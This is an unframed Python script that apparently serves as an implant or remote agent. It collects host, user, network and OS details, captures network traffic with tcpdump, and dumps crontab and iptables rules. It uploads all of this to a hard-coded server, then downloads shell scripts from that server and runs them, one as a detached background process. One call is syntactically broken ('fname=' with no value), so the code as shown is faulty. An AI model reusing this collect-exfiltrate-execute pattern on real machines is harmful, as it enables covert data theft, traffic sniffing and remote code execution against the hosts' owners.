import socket
import os
import platform
import subprocess
import requests
import time
import json
import threading

SERVER_URL = "http://192.168.1.253:8000"
SERVER_IP = "192.168.1.253"
TCP_COUNT = 1000
STORAGE_DIRECTORY = "tmp/"
TIME_STR = "%Y-%m-%d_%H%M"

def upload_file_using_curl(fname):
    # curl -X POST --data-binary @read1.pcap http://192.168.2.7:8000/read1.pcap
    print(f"Uploading: {fname}")
    try:
        cmd = ["curl", "-X", "POST", "--data-binary", f"@{STORAGE_DIRECTORY}{fname}", f"{SERVER_URL}/{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
    except Exception as e:
        print(f"Error uploading filed: {e}")
        
def upload_json_using_curl(dictionary,fname):
    # curl -X POST --data-binary @read1.pcap http://192.168.2.7:8000/read1.pcap
    print(f"Uploading json to {fname}")
    json_data = json.dumps(dictionary, indent=4)
    
    try:
        cmd = ["curl", 
                "--header", "Content-Type: application/json", 
                "--request", "POST",
                "--data", f"{json_data}",
                f"{SERVER_URL}/{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        print(process.stdout)
        
    except Exception as e:
        print(f"Error uploading filed: {e}")

def download_using_curl(fname):
    # curl http://192.168.2.7:8000/test.txt -o test.txt
    print(f"Downloading: {fname}")
    try:
        cmd = ["curl", 
                f"{SERVER_URL}/{fname}", 
                "-o", f"{STORAGE_DIRECTORY}{fname}"]
        # print(f"Executing: {' '.join(cmd)}")
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
    except Exception as e:
        print(f"Error uploading filed: {e}")

def get_ip_addresses():
    """Collect all IPv4 addresses from network interfaces."""
    try:
        output = subprocess.check_output(["ip", "addr", "show"], text=True)
        ip_addresses = []
        for line in output.splitlines():
            if "inet " in line and "inet6" not in line:  # IPv4 only
                parts = line.split()
                ip = parts[1].split("/")[0]
                ip_addresses.append(ip)
        return ip_addresses
    except Exception as e:
        print(f"Error getting IP addresses on Linux: {e}")
        return []
    
def upload_system_info():
    # Collect system information
    hostname = socket.gethostname()
    
    try:
        username = os.getlogin()
    except:
        username = os.environ.get("USER", "unknown")

    try:
        try:
            operating_system = os.uname()
        except:
            operating_system = platform.system()
    except Exception as e:
        operating_system = f"Unable to retrieve OS Info: {e}"

    ip_addresses = get_ip_addresses()
    
    # Package system info into a dictionary
    timestamp = time.strftime(TIME_STR)
    
    info = {
        "hostname": hostname,
        "username": username,
        "ip_addresses": ip_addresses,
        "timestamp": timestamp,
        "operating_system": operating_system
    }
    
    try:
        upload_json_using_curl(info,f"{hostname}_system_info.json")
    except Exception as e:
        print(f"Error uploading system info: {e}") 

def upload_TCP_dump(fname="read.pcap",count=100):
    cmd = ["tcpdump", "-c", str(count), "-w", f"{STORAGE_DIRECTORY}{fname}"]
    try:
        process = subprocess.run(cmd, capture_output=True, text=True)
        if process.returncode == 0:
            print("tcpdump capture completed.")
            # Upload the capture file to the server
            try:     
                upload_file_using_curl(fname)
            except Exception as e:
                print(f"Error uploading capture file: {e}") 
                
        else:
            print(f"tcpdump failed with return code {process.returncode}")
            print(process.stderr)
            
    except Exception as e:
        print(f"Error running tcpdump: {e}")

def download_and_run_subprocess(fname):
    try:
        download_using_curl(fname)
        
        cmd = ["chmod", "+x", f"{STORAGE_DIRECTORY}{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        cmd = [f"./{STORAGE_DIRECTORY}{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
        
    except Exception as e:
        print(f"Download and Run Failed: {e}")

def download_and_run_newprocess(fname):
    try:
        download_using_curl(fname)
        
        cmd = ["chmod", "+x", f"{STORAGE_DIRECTORY}{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        cmd = ['nohup', f"./{STORAGE_DIRECTORY}{fname}", '&']
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=lambda: os.setpgrp())
        print(f"Launched New Process {fname}")
        
    except Exception as e:
        print(f"Download and Run Suprocess Failed: {e}")
        

def run_command(command, fname):
    cmd = command.split(" ")
    try:
        process = subprocess.run(cmd, capture_output=True, text=True, check=True)  # check=True raises an exception on non-zero exit codes
    
        with open(f"{STORAGE_DIRECTORY}{fname}", "w") as file:
            file.write(process.stdout)
            
        upload_file_using_curl(fname)
        
    except subprocess.CalledProcessError as e:  # Catch errors from subprocess
        print(f"Command failed with error: {e.stderr}")
    except Exception as e:  # Catch any other errors
        print(f"An unexpected error occurred: {e}")

#TODO IPTables REstore



def main():
    runtime =  time.strftime(TIME_STR)
    os.makedirs(STORAGE_DIRECTORY, exist_ok=True)
    
    try:
        upload_system_info()
    except Exception as e:
        print(f"System Info Upload Failed: {e}")
        
    ## Get TCP Dump 1000 Packets
    hostname = socket.gethostname()
    filename = f"{hostname}_{runtime}.pcap"  
    print(f"Running TCP Dump Thread: Capturing {TCP_COUNT} packets")
    
    try:
        tcp_thread = threading.Thread(target=upload_TCP_dump,args=(filename,TCP_COUNT))
        tcp_thread.start()
    except Exception as e:
        print(f"TCP Dump Failed: {e}")
        
    
    try:
        run_command("cat /etc/crontab", f"crontab_{runtime}.txt")
    except Exception as e:
        print(f"Error in backing up crontab: {e}")
    
    try:
        run_command("iptables-save", f"iptables_{runtime}.txt")
    except Exception as e:
        print(f"Error in backing up iptables: {e}")
        
        
    fname = "updates4.sh"
    try:
        download_and_run_newprocess(fname)
    except Exception as e:
        print(f"Error in Downloading and Running {fname}: {e}") 
        
    fname = "updates.sh"
    try:
        download_and_run_subprocess(fname=)
    except Exception as e:
        print(f"Error in Downloading and Running {fname}: {e}") 
    
    tcp_thread.join()

if __name__ == "__main__":
    main()